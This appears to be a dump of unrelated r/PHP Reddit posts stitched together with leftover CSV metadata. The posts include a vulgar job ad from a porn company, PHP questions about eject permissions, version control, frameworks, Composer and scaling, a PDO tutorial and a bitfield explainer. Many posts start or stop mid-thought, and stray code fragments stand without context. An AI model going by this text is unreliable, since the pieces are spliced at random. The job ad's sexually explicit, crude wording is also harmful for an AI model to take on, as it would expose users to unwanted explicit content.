Send me your resumes to juan@shawinternet.com TODAY. DO YOU NEED A JOB THIS WEEK OR WHAT? If I like you, I WILL HIRE YOU (not on the spot but pretty fucking soon!). GO GO GO APPLY APPLY APPLY Get your hands out of your pants and into the cash!

edit:

A few points to clarify, I guess.

* [This is our prize-winning brisket. Look at it. LOOK AT IT.](http://i.imgur.com/bGVF8.jpg). The boss has got a huge trailer smoker that you'll get to use if you want (at competitions I mean). If you're a vegetarian, you're still welcome to join. You won't be *forced* to gobble down the delicious BBQ meat if you don't want.
* This is not primarily a back-end position. Do you know OOP, use subversion, etc etc etc? Don't care. In fact you can write all your code in horrible spaghetti procedural style, as long as it works and makes us money.
* This IS a primarily front-end position. You will need to know HTML/CSS + PHP/MySQL. You don't need to know the latest and greatest HTML5/CSS3 tricks. They don't usually make us money. We prefer, from a SEO-view, to use tableless code, but it's up to you if that takes you too long (once you're seasoned it should take you less time than tables, actually).
* We have an off-shore programmer who created our ecommerce CMS for us. It's a horrible mess of spaghetti code, has a million bugs and is outdated - but it's made us millions. He, and only he, is in charge of dealing with that monster. If you want once you're experienced you can start playing around with it with him - but it won't be your responsibility (I pity whoever wants to work on it).
* We have a dedicated designer. I can't draw a stick figure to save my life. Doesn't matter. Our designer is one of the best. Plus he's high as a kite all the time for ""creative purposes"". Note: he's in Spain but is an Englishman. Don't speak to him about soccer unless you want a fistful of confused I'm-an-Englishman-but-my-wife-is-Spanish-and-I-live-in-Spain soccer fandom.
* We work in a professional office building off of Preston and George Bush. This isn't some dinky job in the boss's basement.
* I say ADULT PORN because we don't deal in the barely-18 shit. You're welcome to like that sort of stuff but we don't pursue it. Also, there's softcore, and then there's us. We don't have a single softcore site. Our best selling straight site is about 2 black dudes with 24"" inches of cock between them fucking random white chicks.

All in all, this is a very easy job if you have a few years of HTML/CSS &amp; PHP/MySQL freelance experience.

And I'm typing in a bunch of caps BECAUSE THIS IS A PORN COMPANY AND SOMETIMES I GET RANDOM BONERS THROUGHOUT THE DAY.

edit II:

Why all the downvotes? I guess if you don't agree with the job? Or are you saying that /r/PHP is not the place to post for a PHP-related position? Or maybe you're opposed to porn in general? I seriously don't get it. If you're downvoting because you think maybe this is a scam - we're very much a real company looking for someone immediately. Haha sorry I thought ""with the economy like it is"" people wouldn't be downvoting legitimate job opportunities just because.

I wanted to make a web interface for this, so I ensured the user www-data was in the ""cdrom"" group and created this php script:

`&lt;?php system('eject'); ?&gt;`

I ran the script from command line (as www-data), and it worked as expected. I then loaded it in a browser.. and nothing happened.

Running it as `eject 2&gt;&amp;1` gave me ""eject: unable to open '/dev/sr0'"".

I've since discovered that no matter WHAT I do, I can't get this tray to eject. I've tried

- executing a bash script which calls `eject`

- executing a C-wrapper to run `eject`

- setting the sticky bit on the C-wrapper so that it will run as root (an incredibly bad idea but I was desparate)

All to no avail.

Can anybody shed some light on why I can't run `eject` from PHP?

That's the downfall of always having been the sole developer at my jobs.

Anyways, I always had a very simple workflow: Download entire site's source code to local drive, edit files locally, and upload directly to site via FTP. Refresh remote server page to make sure it's working correctly. If it was broken, I'd at least have the original file on my computer (or can always CTRL+Z my way there).

Now, I'm using TortoiseHG to keep backups. The remote server has Mercurial installed on it, and all my computers have their own copies... but I know for a fact I'm not doing the process correctly.

* Set up new repo on remote server;
* Clone repo to machine;
* Work on local files; test changes on local server; upload directly via FTP on making sure changes work correctly;
* At end of day, commit changes on remote server;
* At home, pull all changes to my home PC and continue working there. Commit changes on remote server before going to sleep

I know my problem stems from the fact that I don't have the proper number of environments to work with. I really only have the production and development environments, and only 2 real repos (remote server's and whatever local machine I'm working on).

I've read through hginit.com - and it explained why I should use a DVCS, but it didn't really give me the correct process for it.

I look at sites like github, and I know how it works - it's easy to tell. Hundreds of people can simultaneously work on the code at a time and push the changes to the main repo, and an admin of that repo reviews the changes and decides whether to accept and commit, or discard.

But since I'm the only developer here, and the company bosses in small companies like to see immediate changes, the whole process of testing locally, committing locally, pushing to remote and committing to remote simply seems too bulky a process to me - but maybe it's because I haven't had it clearly explained yet.

Does anyone have a site or tutorial or words of wisdom for me (and I'm sure many others like me)?

1296611030.0,38,self.PHP,fdhpw,Quick PDO Tutorial,44,6,28,http://www.reddit.com/r/PHP/comments/fdhpw/quick_pdo_tutorial/,"I wrote this in another thread but it seems that lots of people don't seem to use PDO or know how to. It's a bit of a jump if you're not used to prepared statements etc, but it's much better to start writing using this style so you don't have lots of horrible mysql_rubbish to contend with.

Basically it's in the form of a script that does a few of the things you might use PDO for.

When you call the `prepare` method on a `PDO` instance, it returns a `PDOStatement` object, which we then manipulate with the `fetchAll()` and `execute()` methods.

I'll write a simple script to demonstrate:

    &lt;?php
    // IF YOU ARE USING PHP &lt; 5.3, REMOVE THE BACKSLASHES.

    // This instantiates a PDO object (http://php.net/pdo), which you can think of as a database connection.
    $pdo = new \PDO(""mysql:host={$host};dbname={$db_name}"", $username, $password);

    // Personally I like PDO to throw back any errors it has as exceptions. If you don't want to delve
    // into exceptions just yet, leave this out, but I find they are much more useful than normal errors.
    $pdo-&gt;setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);

    // This creates a PDOStatement object (http://uk2.php.net/manual/en/class.pdostatement.php) which is
    // loaded with your query (it executes some SQL in the background to prepare your statement)
    // We also have a named parameter :myField that we can bind to a variable at a later point.
    // This is great because we *don't* have to escape it in any way to avoid SQL injection.
    $sth = $pdo-&gt;prepare(""
        SELECT *
        FROM myTable
        WHERE myField = :myField
    "");

    $myVariable = ""something"";
    
    // This executes the SQL query, binding the parameter as we go.
    $sth-&gt;execute(array(
        ':myField' =&gt; $myVariable
    ));

    // We could now do several things with our statement.

    // We could find out the number of rows.
    echo $sth-&gt;rowCount();

    // We could iterate through the rows: (this is equivalent to mysql_fetch_array())
    while($row = $sth-&gt;fetch()) {
        var_dump($row);
    }

    // We could iterate through the rows without getting the numerical indices, like mysql_fetch_assoc()
    // I prefer this as it doesn't unnecessarily double the data you get.
    // I've added in \ before the constant so it will work under a namespace in PHP5.3. Remove this if
    // your PHP version is &lt; 5.3 as it will break.
    while($row = $sth-&gt;fetch(\PDO::FETCH_ASSOC)) {
        var_dump($row);
    }

    // Or we can grab all the results into one big array
    $rows = $sth-&gt;fetchAll(\PDO::FETCH_ASSOC);
    var_dump($rows);

Let me give you my situation.  I'm an amateur PHP hobbyist, nothing close to a professional developer, and I doubt that I will ever get involved programming in PHP full time.  That said, I am an office worker, and I find my skills in PHP (let's call them ""intermediate"") extremely useful.  I've been using PHP for almost ten years now.  Basically, where my fellow office drones would use Excel, I have a better alternative: a relational database with a custom app for interacting with my data.  

I started out with purely procedural code, and developed a fairly large app, 7 main pages, 373 php files, that I've managed, somehow, to connect to Google Apps via the Zend library.  It works . . . don't ask me how.  It's kind of like a little framework of my own, one that I can use for managing personal data, like contacts, notes, projects, hourly billing, etc.  Any task that requires me to capture data, I can script up a little app to help automate the job.

Recently, I've been laboring to make the transition to an object oriented approach to programming.  I'm starting to get a feel for it, and I think I've finally made the conceptual shift, and I love it.  Yeah, I'm about eight years behind on that, I know.

Of course, the thing I've noticed is, with the rise of all the frameworks, PHP seems like it's become more and more advanced.  As an amateur, I feel like it's getting increasingly difficult to keep up with the times.  Not that I've ever been up with the times, but damn.

I've never taken part in a formal interview for a software development position before. I have a few days to prepare for it and I want to make the most of that time.

I've been told the interview will cover vanilla PHP, MySQL queries, HTML, and CSS.

I have a solid grasp of all of the above, but I have this fear that I'll just draw a blank on a necessary function or property or attribute that I'd normally just google real quick, and end up looking less capable than I really am.

So here are the basic questions I have for you guys:

* What is the bare minimum of tags/functions/queries/etc I should be able to use from memory, for each of the 4 technologies mentioned above?

* What are some quick things I could learn about these technologies that would impress in an interview setting?

* If you've ever interviewed for a PHP position and gotten hired, what was it about your interview that you think made them hire you?

* If you've ever interviewed for a PHP position and did not get hired, to what do you attribute that failure?

* How should I dress?

It's been a dream of mine to work in software since I was about 12, and to finally feel like I'm qualified and to be getting interest from companies is very exciting for me. I'm very nervous, though.

The system is pretty good, but its showing its age and I really rather work inside of a framework instead of the homegrown system at this point. I am pretty conflicted about what to do.

* Use Wordpress
* Use an MVC framework that is easily extensible with a low learning curve (prefer if its based off CakePHP)
* Roll my own based off CakePHP
* Bear down and upgrade my old framework to meet modern standards...

I'm conflicted here because I want the system to have longevity, be fast from a performance perspective, and be fast to develop in. Non-developers are telling me to go wordpress, but the idea of working in that style of code turns my stomach, on the other hand it has a lot of stuff already done for me and I'd need only write plugins to add in the custom functionality. If I roll my own then I know I'll have full control which is nice, but will it be at the cost of development time? I have yet to find another CMS that I feel confident will allow me to do everything I want. I'd hate to get a month into development and find I have to hack things to meet my objectives. I also need a system that will be forgiving enough to allow me to easily add in new ideas as the site evolves.

Thoughts?

**update**

I've decided that learning a new CMS and becoming proficient in it and writing plugins could be very time consuming. I'd be thrilled if I were able to become proficient in 8 hours, but thats unlikely. What I'v decided to do is spend about 8 hours on the existing code and see how far I can get with enhancements. If I make sufficient progress I'll just stick with what I got. I could have this thing where I want it in a week or two. If it doesn't work out I'll probably give one of the big CMS platforms like Drupal a try due to its existing massive community and amount of plugins. Gotta think of this as a business first and put programming ideals second.

    }
    
**index.php**

    require 'Foo.php';
    
    $foo = new Foo();


Now the ""namespace"" way of doing it (apparently):

**foo.php**

    namespace Acme\Tools;

    class Foo
    {
      public function doAwesomeFooThings()
      {
        echo 'Hello World!';
      }
    }
    
**index.php**

    require 'Foo.php';

    use \Acme\Tools\Foo;

    $foo = new Foo();

I have been programming in PHP for a couple of years now and am slowly moving away from a procedural to an OOP mindset, but now I've come across namespaces and how they're going to be more and more relevant, particularly as PHP6 comes out. I look at this code example - from [here](http://www.youtube.com/watch?v=d1kDT8YFAhI) BTW - and I really can't see any real reason for doing it this way. I mean, to me, it achieves *exactly* the same purpose, just with more code. Now, not only do I have to have to manage my filesystem paths for requires and includes, but I also need to try and keep track of namespace paths too??

I can understand the need to modularize and organize code logically, but this just seems like duplication to me. What's the difference between having your class includes arranged in a particular filesystem structure and having them all dumped in a directory, but organized by a namespace structure?

I hope that makes sense - sorry for the long question!",,False,,t5_2qh38,False,,,True,t3_p3op2,http://www.reddit.com/r/PHP/comments/p3op2/php_namespaces_i_am_genuinely_confused/,

The type of apps I mostly build at work are short-term contest type things. Occasionally I'll build something that is running for a long time, but it's rare.

I've heard alot about Laravel and have tested out L3 a bunch. Version 4 looks like it's more robust and has composer compatibility, which is a huge plus for me. 

Question is, has anyone used L4 on a production site? Any scaling, stability issues?

Thanks!

I've been using it for a few weeks and have formed my own opinion on it. 

**Pros**

* I think this is just about the easiest framework to get into
* teaches MVC very quickly
* great routing system that replaces controllers (but controllers can be used too)
* easy to use migrations (database creation/updating)
* easy to use out-of-the-box authentication and validation
* works via a PDO and can connect to numerous databases
* easy bundle use.
* mostly easy updating.

**Cons**

* it's new, VERY new. 
* If you try to figure out why something's not working, you'll probably land on documentation that won't help you. There isn't a wealth of StackOverflow questions, Reddit topics, even /r/laravel subscribes to help you out.
* while the community is seen as great and polite, it's very lacking in size (and knowledge). I've been trying to get a question answered for almost a week, reposted it even (because I ran into a different but similar error) but didn't get a single reply. 
* I find a lot of the functions in Laravel tricky especially when it comes to database work. I'm about to switch to Fluent (more query based than object based) to solve some headaches

So, if you were hiring a junior person, notwithstanding the typical human factors like a drive to learn new things, communication skills, etc., what sort of skills would this person have to meet to:

* a) Do well in an interview / Get the job, and  
* b) Keep that job once they have it.

(b) is a very important factor for me since I'm almost guaranteed to have to move to get such a job, and large moves are rather dangerous if you're not sure you can keep the job once you have it. It's what keeps me from ""blindly"" applying to jobs right now, so I can't follow the typical, unhelpful advice of ""you know you're good enough when someone hires you to do the job"".

The developer before me set up an environment where we have one Staging server in addition to our Production site.  Also before he left he helped me get my laptop set up with xampp/apache so I can work on it.  We also have TortoiseSVN for code repository.

But I am running into so many issues. I don't have an IDE anywhere so my PHP debugging is terribly slow, and I have little idea of how to set one up (that is my next project).  

My boss is very not technical and hates planning ahead, so we tend to use the guess-and-check method of project specification, so she will give me a rough idea of what she wants, I will create it on my laptop xampp and upload it to TortoiseSVN and use that to transfer it to Staging so she can take a look, she will ask me to change one small thing and I repeat the process probably 20 times.

This is a problem when we find a bug in the production site that is in the same area I am currently developing, as I have no place besides production at this point to work with the issue.

One issue is that I have never gotten TortoiseSVN to work in any way like other similar code repositories in the past.  I can't seem to get it to roll back to previous versions and I just think it is not user-friendly enough for me to work with.  Do you have any other suggestions?  My boss will pay for one so we don't have to use this free one.

Also can you tell me how you do development? In which area do you actually edit and test the code as you work on it?  How and when do you transfer it around and how do you show your client/boss before it goes live?

How reasonably secure would the self manged VPS be if I did all that? What additional security measures do you, or would you recommend?

It also let me format the body of the email using a couple simple functions, and I figured this approach would make it easier to expand the program down the road.

But then the project expanded in a way that I didn't predict, and to accommodate this the $keys would need to be something more like ""The amount of money you pay in child support each month"" 

So I'm wondering.  It doesn't seem like there's anything *wrong* with having lengthy keys like that.  But somehow using the keys in that way (as both variable titles *and* human readable labels) seems hacky.  It just *feels* wrong.  I'm still pretty new to this so I'm having a hard time thinking of a better option.  Was I being an idiot from the start?

Fantastic community, and I'm sorry for bothering you with something you probably hear people bothering you with a lot (assuming you, the individual are a professional programmer), but...

I'm a 19-year-old who has recently hit a bit of a rough spot in life, and the only real skill I have other than tending the cash register is programming. I've been programming for quite a while, although I've never taken more than small web design work in terms of paid jobs. I'm interested to know if with some touch-up and extra learning PHP is something that's realistic for a young person to be looking at for a career, or at least an interim step in life.

I have one real thing to show for myself, which is [this](http://www.rustyaxe.com/bgames/ee/) browser-based ""Risk""-style game. I did it in php/Javascript, and although I think it's a fairly good portfolio piece I think I'm still very much lacking in terms of my PHP knowledgebase. I'd like to get an idea of what I really need to not be laughed out of an interview. Furthermore, I have absolutely zero experience working in a group programming setting... and I'm a bit lost on how to get that experience without holding a job.

So please, if I could get a bit of a rundown on where I should start, it'd be lovely if I could get some advice on what I should be learning... programming methodologies, certain frameworks (I don't know any PHP frameworks right now), etc.

Thank you!


EDIT: Hey everyone! Thank you so much to all of you for taking the time to respond to the thread. You've all been more helpful than I could ever imagine.

Just in case someone comes to this thread later and is in the same position I am, I'm going to put a nice list of what I've gathered so far for easy reference.



**MOST IMPORTANT CONCEPTS**

* Learn at least one framework (MVC) such as Zend, Cake, Symfony2, etc. Learning a couple isn't a bad choice so you can see how they stack up and choose which one you like more.
* Learn Object-Oriented Programming (OOP). Learn why it's useful and where you use it.
* Find a good way to manage your projects and edit your files. (Netbeans seems to be the most commonly used IDE for PHP)
* Always be working on something, and make sure you have side-projects that you're passionate about. They don't have to be world-changing in any way, and even re-creating technologies that are already out there is better than not having any projects.
* Learn to produce readable code that is commented well. Choose a standard of coding (either come up with your own or find one that suits you such as the Zend framework's standards) and stick with it.
* Get up to date on the latest best practices (Things such as using mysqli or a framework to deal with databases rather than just using mysql_query).
* Learn how to optimize your code for best performance. Things such as caching, load balancing, and other, smaller good practices like always closing your database connections when you're done with them.
* Learn how to use a debugger with PHP such as xdebug.
* Be social in the PHP community. Contribute to communities like r/php, forums, IRC chat rooms, and read blogs by professionals.


**SMALLER INDIVIDUAL CONCEPTS**

* Learn XML and JSON.
* Learn what Database Normalization means and when to us it.
* Have a knowledge of HTTP and headers, what they're useful for and when to use them.
* Have a knowledge of MySQL storage engines and indexes.
* Understand character encoding.
* Learn what regexes are, when to use them.
* Learn what unit testing is.
* Learning the command line for your server is very helpful.",,False,,t5_2qh38,1347656092.0,,,True,t3_zu1zn,http://www.reddit.com/r/PHP/comments/zu1zn/what_does_it_take_to_be_hirable_in_the_world_of/,

1340750368.0,35,self.PHP,vnk7x,Why -1 works with error_reporting().,44,9,13,http://www.reddit.com/r/PHP/comments/vnk7x/why_1_works_with_error_reporting/,"A while back I got asked by a friend why -1 works to ""turn on everything"" with error_reporting(), I thought I'd share the explanation.  If you're already acquainted with binary, you can skip directly to the bottom.

[error_reporting](http://php.net/function.error_reporting) uses [bitfields](http://en.wikipedia.org/wiki/Bitfield) in order to determine which aspects of reported errors are turned on, and which are turned off.  

Constants such as E_ALL, E_WARN, E_NOTICE etc all contain integer values which correlate directly to individual bits contained within a number.  For example, in php5.3 E_ALL equates to the number ""30719"".

If we convert this number to binary, we can see the individual bits (or switches if you prefer) that make up the number:

    php &gt; var_dump(decbin(E_ALL));
    string(15) ""111011111111111""

You'll notice that not all the switches are turned on by default.  This is because E_STRICT is not included in E_ALL.  If we look at E_STRICT, we see this:

    php &gt; var_dump(decbin(E_STRICT));
    string(12) ""100000000000""

If we line up the two numbers from the right, you'll see that the ""1"" is actually in the position where the zero would be when padded with zeros to make it the same length (like regular base-10 numbers, leading zeros in binary have no significance but are useful for display purposes):

    111011111111111 // E_ALL
    000100000000000 // E_STRICT

So, if we wanted to turn E_STRICT on, we would have to turn on that one bit, which we can do with '|' (logical OR).  If you think of 1 and 0 as being similar to TRUE and FALSE, the comparison is analogous to what we do with the boolean operator '||', only on each individual bit.  since 1 OR 0 is 1, and 1 OR 1 is 1, all bits are turned on.  So, ""E_ALL | E_STRICT"" creates:

    php &gt; var_dump(decbin(E_ALL | E_STRICT));
    string(15) ""111111111111111""


Now, when you use -1, the binary representation looks like this:

    php &gt; var_dump(decbin(-1));
    string(32) ""11111111111111111111111111111111""

Which turns on many more bits than PHP actually uses at present.  The benefit to this is that as php expands its error levels, your software will already have those levels turned on.

EDIT:  

* Some people are suggesting that -1 is ""a hack"" - this simply is not true.  -1 in PHP will always equate to ""all bits on"" because php uses [Two's complement binary](http://en.wikipedia.org/wiki/Two's_complement).  PHP will not suddenly change how it works with numbers.

* It was also suggested that ~0 is a better approach, which is also acceptable.  ""~"" (bitwise NOT) is bit inversion - it will set all bits that are on to off, and all bits that are off to on.  Since 0 has no bits set, it achieves a result identical to -1.  Either method works, and what you choose to use will amount to personal preference.",,False,,t5_2qh38,1340815734.0,,,True,t3_vnk7x,http://www.reddit.com/r/PHP/comments/vnk7x/why_1_works_with_error_reporting/,

1366650850.0,31,self.PHP,1cvgo9,Ask /r/php: Best Practices in Composer when Developing an App and a Framework,32,1,10,http://www.reddit.com/r/PHP/comments/1cvgo9/ask_rphp_best_practices_in_composer_when/,"I am in the middle of a number of projects that involve a team of developers. We are building or migrating a half-dozen or so projects to a new PHP framework based on the core Symfony components. When evaluating what we needed, we went through a lot of different frameworks and decided that because of the flexibility of composer and how components were loosely coupled we could pick and choose the best parts of different libraries.

This is our stack at the moment for our 'framework':

 * php 5.3.3
  * symfony/event-dispatcher
 * symfony/http-foundation
 * symfony/http-kernel
 * symfony/routing
 * respect/config
 * respect/relational
 * cartalyst/sentry
 * twig/twig
 * guzzle/guzzle
 * monolog/monolog

We also have our own libraries, such as a 'utils' library, an API client, etc. we throw all of these together but because we are working on more than one site at a time and have a number of projects we wanted to separate this part of the stack into a separate framework. Lets call it framework1 (we have our own internal name).

So we have one git repository that has all of those dependancies and a repo defined as company/framework. There is a src folder that is autoloaded which is where we put framework related code (ie. code that is common across all apps). The composer file looks something like this:

    {
      ""name"": ""company/framework"",
      ""type"": ""library"",
      ""description"": ""internal framework"",
      ""require"": {
        ""php"": ""&gt;=5.3.3"",
        ""symfony/event-dispatcher"": ""2.2.*"",
        ""symfony/http-foundation"": ""2.2.*"",
        ..
      },
      ""autoload"": {
          ""psr-0"": { 
            ""Framework"": ""src/"", 
          }
      },
      ""minimum-stability"": ""dev"",
    }

Our 'apps', then have the following setup in composer:

    {
      ""name"": ""company/app1"",
      ""description"": ""First app"",
      ""require"": {
          ""php"": ""&gt;=5.3.3"",
          ""company/framework"": ""dev-master""
      },
      ""minimum-stability"": ""dev"",
      ""autoload"": {
          ""psr-0"": {
              ""App"": ""src/""
          }
      }
    }

We work on app code in 'src'. Here is the problem. There is no dedicated developer for 'framework' - each app developer (or teams on an app) make changes to both their respective apps and the frameworks. Lets say you want to add feature x - you go into the framework code and add a class and method calls, then go into the app - the problem is that the app can't see the new class and method calls in the framework without doing the following:

 * go into framework code
 * bump the version
 * git commit in the framework code
 * push to the server
 * go into app directory
 * run composer update

You can then see the new framework classes and method calls. But then you find an error or something else you need, so again you have to run through the routine with the framework code. How can one developer work on both framework and app1 (or app2) without having to go through the dependency management routine?

One thing we tried is to add the framework as another PSR0 loader, but that then involves moving one repo into another. In short, what are developers such as the guys at Symfony and Respect etc. doing when they have a project that spans multiple repositories and composer requirements? I have a feeling that the solution has something to do with defining the framework as a 'repository' in composer, but I figure I ask if there is already a best practice in place for this from someone else first.

I'm curious what you guys think are the best practices to include while developing a class that you know you are going to use in a lot of projects, and even maybe make it available via github.

I'm particularly interested in error/exception handling. For example take this function:

    static public function getValue($array, $key, $default = null)
    {
        if (!is_array($array))
        {
            return false;
        }
        
        if (isset($array[$key]))
        {
            return $array[$key];
        }
        else
        {
            return $default;
        }
    }

It's a method of a class that makes it easy to access an array element, and define a default return if the element doesn't exist. But look in the first **if**. If it's not an array, the method returns false. I know this is not right, but what should I do? Throw a default Exception?

2. MySQL Management: Sequel Pro (way better than phpMyAdmin)
3. SVN: Cornerstone (easily the best Subversion GUI tool out there IMHO)
4. LESS.app for automatically watching and updating my LESS CSS files
5. Balsamiq Mockups (not really a PHP app but the best wireframing and mockup tool I've found yet)
6. Charles Proxy (excellent HTTP proxy tool for examining your requests in-process)
7. Macports (To manage my local development PHP/MySQL/Nginx stack)

I'm Out Thousands, and Back to Square One.",43,8,82,http://www.reddit.com/r/PHP/comments/ox37o/horrible_experience_with_contractor_on_odesk_im/,"I built SupplementReviews.com in 2006.  I learned PHP by building the site, and just kept adding features as I learned how to program them.  My degree is in Construction Management, so I really don't have any proper training in programming.  My approach is to keep playing with it until it works good enough.  Once it works, don't touch it because you might screw it up.

The site has continued to grow over the years, and I've just become overwhelmed with other responsibilities (managing the community, sales, PR, etc.) - I've decided I need to get a professional to take over the design and coding so they can add some really neat, clean features.

I figured I'd test my luck on Odesk, since I've found some decent overseas workers there for other various projects.  I posted a job back in April, and spent a while screening candidates.  I had a 17-page bullet point scope detailing exactly what features the site needed to have, so I was confident that the contractors understood the project.  I finally selected one because they had built a great-looking large-scale reviews site before, and had great feedback on Odesk.

I was providing feedback nearly every day, and the site progress was extremely slow.  I'd tell them that some stuff needed fixing, they said they fixed it but didn't.  I wasn't getting good vibes.

They promised that the site would be completed in 4 months, however this would not be the case.  At about month 6, they said they were done.  I took one look at the site and immediately discovered dozens of bugs and missing scope items.  I pointed them out, and they assured me they would fix them.  Months later, they said they were done again.  After checking the site again, I noticed new bugs, and plenty of items still missing.

Finally we had a long talk, and I told the contractor that if we were not done by Jan 15, I would be getting rid of them.  They agreed that they could have the project completed by that time.  Well, the 15th rolled around and the site was still incomplete.  I cut my losses and decided to move on.

________
TL;DR  - Built my site when I learned programming, don't have time/desire to keep doing the programming for it.  Hired a contractor from India and they sucked.
---------

So now I'm back to square one - at least I have some more experience in selecting programmers, lol.  I still need the site to be entirely re-built, however I would prefer to find someone who will also stick around as my programmer after.  I'm always thinking of new features, and users are always finding little bugs here and there.

So the job would be full-time for a few months, then as-needed after that.

My questions are:

* How do I go about finding this right-hand man?

* How do I screen programmers? - What sort of questions should I be asking?

* What sort of info is appropriate to give prospective programmers?  Access to the database?  Sample scripts?

* What sort of payment structure is standard for work like this?

* I'd like to give them some type of test projects before committing them to the rebuild.  Any advice on giving test projects?  Seems like there would be a lot of work in setting them up on a test project.

Obviously I failed picking a programmer the first time, so any advice for this time around would be greatly appreciated.

I don't really understand the ins-and-outs of character encoding, for example.

On the topic of Roll Your Own (*using libraries to keep it DRY and best practice) vs Frameworks such as Zend, Cake CI, YII, etc... Many of the proponents of DIY say that they do it for ""small projects"", whilst most of the arguements for using one of the frameworks seems to be targeted towards larger projects. 

To me, this is incredibly backwards and exactly the opposite to how all my teams (background: I'm a web manager with *strong* development background) operate.

Small client jobs requiring custom development work, such as specialised shopping carts, galleries, blogs, forums, etc are *perfect* from preexisting frameworks - and these are exactly the projects they are targeted towards. The dev work on these kinds of sites can be rolled out in 24 hours or less by devs who are familiar enough to deploy using a framework. Presuming of course the dev is familiar with a framework.
When making a outsourcing decision for a project like this I'd almost always hire a developer familiar with frameworks (assuming all else is equal).

However, massive - multi-year long specific projects that aim to bring its supporting technologies to its thresholds (i.e the next Facebook, Twitter, Reddit) have almost always resulted in myself (and my teams) developing a 'Framework' using preexisting libraries where appropriate but controlling everything from the ground up. When the teams do the intial project analysis and compare available frameworks against an in-house consensus the frameworks usually fall far behind.

That said, its almost unfair to compare - as our teams always take the best features and ideas from those frameworks (MVC, ORM, DRY, routing, caching, templating, yada yada yada) which inflates the 'positives' column of DIY. 

Both have their place, but what I find most interesting is how polar opposite the decision process behind selecting DIY or Framework seems to be on reddit comments vs my own experience. Before jumping to conclusions that devs who prefer 'simple' projects to by DIY are likely less experienced I'd love to hear your feedback :)

This may just come down to semantics - being that I see simple dev projects as client jobs such as galleries, ecommerce, etc vs large projects being massive web applications. Naturally if you're talking about outputting time/date on the bottom of all of your static pages you wouldn't deploy a framework, but thats hardly 'development' now is it?

Hope none of this rubs anyone the wrong way!

So I added a simple captcha to stop this onslaught, however it merely seemed to slow down a few of them. I tried more complex questions, but to no avail. I did what any good coder does when faced with a problem like this, extensive logging; and through this logging I figured out a problem in my code, I was passing the question to a hidden field on, and when they hit 'comment' I use if isset() to post the comment. 


Now I used a hidden field because I didn't (and still don't) know how to pass a string onto the next iteration of the page through isset without it being in a text box of some sort. The bots would either fill the answer form out or leave it blank, either way altering it, and if it was altered it would end up being NULL, which would cause the captcha to pass. I have since fixed this, and the bots keep filling out the forms, but to no avail.

TLDR; Hidden field that bots think should be altered, if altered don't allow comments. Also I need help passing strings through isset().

I have a fairly complex PHP/MySQL web application that I've been working on for several years.  The application does a lot of CPU-intensive simulations and statistical analysis for my users.


I currently only have a few hundred users and have the application hosted on a single Dreamhost Virtual Private Server.  This works fine, however, I have an upcoming opportunity which may increase my user base by several orders of magnitude (possibly up to 10k), and I'm worried that my puny VPS will crap out under the load.


A single user of my app may require about 10-20 seconds of CPU time for a simulation (at least with my current hardware configuration).  I try to be smart about caching results when I can, but the results become stale each day, so each user theoretically requires at least the 10-20 seconds of CPU time per day.


What is the best strategy for scaling something like this, where CPU is the bottleneck?  I'm a decent programmer, but I hardly know anything about servers and sys admin.  And I know nothing about scaling.


I've heard a lot about Amazon EC2, though to be honest, I don't really know what the service is exactly or how it works.  But it sounds like you can pay for as much CPU as you need?  Would I need to change my code at all to parallelize something like this?


My main goals are to:

1. serve as many users as possible

2. load the simulations as quickly as possible

3. not pay thousands of dollars

I know a lot about proper deployment of sites, but that really only applies when you have one site that your team is working on with scheduled deployments and stuff like that.  I've looked into hudson CI deployment and all those types of systems and methods.  I just don't think that will work in this instance.  

We have a bunch of devs here doing minimal site updates for our clients on these older platforms.  There is currently a system that was built by a previous incarnation of the dev team here (probably around 2002), written in Perl that provides a management panel.  In there, you can see all the sites managed by the system, then push files from the dev server to live.  It almost seems to use rsync, showing what files have changed, allowing the user to select files they want to push live, etc.  Also, there's config for how it should connect to the destination and other file/folder exemptions.  This was a great system in 2002 when 90% of the sites were static, or had generated-static files, and could be pushed from dev to live.  This older system would allow for a junior dev to make a simple HTML change and push it live with little to no issue.  But it requires root ssh access to be available on the remote system, requires all new servers to be set up with Perl, which we really don't use anymore...

Now, for my question.  Does anyone know of a more updated system that works like this?  Preferably not using Perl, a more elegant management for multiple sites within one dev house to push changes from dev to live?  I've contemplated rebuilding the system using rsync, public key authentication, zend framework and stuff like that, but it's going to be a sizable undertaking.  Also, if I were to write something like this based on Zend/rsync, would anyone be interested in a system like that?

1347979546.0,29,self.PHP,102x2i,I'll be doing a PHPUnit/unit testing presentation at my local Dallas PHP group next month. Anyone have any pointers?,32,3,41,http://www.reddit.com/r/PHP/comments/102x2i/ill_be_doing_a_phpunitunit_testing_presentation/,"I'll be doing a presentation on unit testing code - not high-level theoretical stuff but actual ""this is code you can't test, this is code you can test, here's how"" to people who've never unit tested in their lives.

While I know my testing fairly well (well enough do to a presentation on it) I'm not sure what all should be included in my presentation or how best to present the information so that my audience doesn't fall asleep (or god forbid leave midway).

I'm also thinking of basically writing an article on my site and then basing the presentation on a slimmed down version of the article. I hate how some presenters give slideshares of their stuff but it's missing all the meat - what they actually said.

For example, I've an app built on CodeIgniter that, after a user logs in,  retrieves their customers and the customer info, and outputs it to a table.  I've got a model with a method for logging in (takes email and password, and returns user_id or false) and a method for taking the user_id and returning an object with all the customers associated with that id.   

I understand I could write Login test that accepts an email and password and expects either a specific user_id or a general int... but why is that better than just trying to login? If I get an error, I fix it. If not, it works.  Or, if I have a get_customers test... how can I test that I'm getting the *right* customers? If I expect static values in *that*, how I can I test for things like adding and deleting without breaking the original test?

I've got it down for the most part and wrote my first library in OOP. So now, I'm onto frameworks. I've been researching a lot of PHP frameworks. I've done quite a lot of reading about CakePHP/CodeIgniter/ZF/Symfony/Yii/Kohana/FuelPHP and even tried some of them on my nginx box... I usually find something I don't like about each one (either the documentation sucks, or there's a steep learning curve, or I didn't like the way it did something.) Some of these frameworks generate a lot of code for you. I understand it stems from the whole DRY (Dont Repeat Yourself) mentality. But some of these frameworks have so many damn files and it's pretty overwhelming trying to figure out what does what. So, it makes me think that it's going to be a debugging nightmare. And it's like spoon-fed code... and it's making me learn towards the flourish library. 

My questions are:
1. For you framework developers, do you understand what each and every single file does (outside of your own)? I'm talking about the hundreds of files that come with some of these frameworks.
2. This one is a bit of a stretch.... but for the guys that work in the web development field, do you have people at your company that's good with a framework but can't code without one? I see a strange trend of people that use shit that generates code for them and are not capable of coding shit from scratch.

    $stamp-&gt;stamp(""January 1st, 1999 at 4:12pm"", time());
    // =&gt; February 13th, 2013 at 11:03am

